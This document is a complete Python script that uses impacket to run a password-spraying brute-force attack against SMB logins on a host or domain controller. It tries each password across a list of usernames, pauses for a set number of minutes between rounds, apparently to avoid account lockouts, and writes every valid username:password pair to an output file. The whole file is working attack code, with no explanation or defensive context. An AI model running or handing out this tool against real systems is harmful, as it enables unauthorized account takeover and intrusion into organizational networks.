#!/usr/bin/env python3

import argparse
import time
from impacket.smbconnection import SMBConnection, SessionError
from colorama import Fore, Style

def brute_force_login(host, usernames, passwords, delay, output_file):
    valid_credentials = []

    for password in passwords:
        for username in usernames[:]:  # Iterate over a copy of usernames to allow removal of items
            print(f"Attempting credential pair: {username}:{password}")

            if login_success(username, password, host):
                valid_credentials.append(f"{username}:{password}")
                print(Fore.GREEN + f"[+] VALID CREDENTIALS FOUND: {username}:{password}" + Style.RESET_ALL)
                usernames.remove(username)

        time.sleep(delay * 60)

    save_valid_credentials(output_file, valid_credentials)

def login_success(username, password, host):
    smb = SMBConnection(host, host)

    try:
        smb.login(username, password)
        smb.logoff()
        return True
    except SessionError:
        return False

def save_valid_credentials(output_file, valid_credentials):
    with open(output_file, 'w') as f:
        for credential in valid_credentials:
            f.write(credential + "\n")

    print("Valid credentials saved to", output_file)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="User credentials brute force script")
    parser.add_argument("-d", "--delay", type=int, default=30, help="Delay in minutes between each password attempt")
    parser.add_argument("-i", "--host", type=str, help="Host/DC IP address")
    parser.add_argument("-u", "--usernamesfile", type=str, help="Path to the file containing the usernames")
    parser.add_argument("-p", "--passwordsfile", type=str, help="Path to the file containing the passwords")
    parser.add_argument("-o", "--outputfile", type=str, default="valid_credentials.txt", help="Output file for the valid credentials")

    args = parser.parse_args()

    if not all(vars(args).values()):
        parser.print_help()
    else:
        with open(args.usernamesfile, 'r') as f:
            usernames = f.read().splitlines()

        with open(args.passwordsfile, 'r') as f:
            passwords = f.read().splitlines()

        brute_force_login(args.host, usernames, passwords, args.delay, args.outputfile)
